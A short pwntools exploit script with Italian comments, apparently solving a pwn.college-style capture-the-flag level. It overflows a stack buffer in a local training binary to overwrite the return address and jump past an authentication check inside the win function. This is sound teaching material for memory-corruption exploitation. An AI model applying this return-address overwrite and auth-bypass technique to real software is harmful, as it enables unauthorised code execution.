#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --
Per risolvere la challenge è necessario cambiare il return address della funzione challenge() con l'indirizzo della funzione win(),
per farlo bisogna calcolare la distanza tra il buffer e il return address (tramite gdb).
Una volta a conoscenza della distanza tra i due si invia un bytestream della lunghezza necessaria
a riempire il buffer e la restante memoria fino all'indirizzo del return address, seguito dal valore che si vuole
inserire al posto del return address. Sostanzialmente si fa overflow del buffer per sovrascrivere 
anche il return address con un valore a scelta (in questo caso l'indirizzo della funzione win()).
La funzione win() esegue un controllo di autenticazione e per essere bypassato è necessario inserire nel bytestream
un indirizzo superiore a quello dell'inizio della funzione win(), in modo tale da saltare il controllo
-----------------------------
'''

context.log_level = 'CRITICAL'

elf = ELF('/challenge/babymem-level-6-1')
p = elf.process()

delta_len = 72
value = p64(elf.symbols['win_authed'] + 28)
bytestream = b'A' * delta_len + value

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
